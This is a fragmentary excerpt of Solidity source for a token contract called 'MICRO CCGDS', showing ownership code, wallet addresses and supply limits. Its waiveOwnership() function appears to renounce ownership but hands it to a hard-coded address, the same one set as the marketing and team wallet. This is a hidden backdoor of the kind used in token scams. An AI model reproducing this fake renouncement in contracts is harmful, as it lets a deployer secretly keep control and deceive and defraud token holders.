...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xFFc4f178fB3a582D2a8ebe4160DAD9a7990Ae045);
    }
...
contract MICROCCGDS is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MICRO CCGDS";
    string private _symbol = "MCCGDS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xFFc4f178fB3a582D2a8ebe4160DAD9a7990Ae045);
    address payable public teamWalletAddress = payable(0xFFc4f178fB3a582D2a8ebe4160DAD9a7990Ae045);
    ...
    uint256 private _totalSupply =  140000000 * 10**_decimals;
    uint256 public _maxTxAmount =   1400000 * 10**_decimals;     
    uint256 public _walletMax =     2800000 * 10**_decimals;      
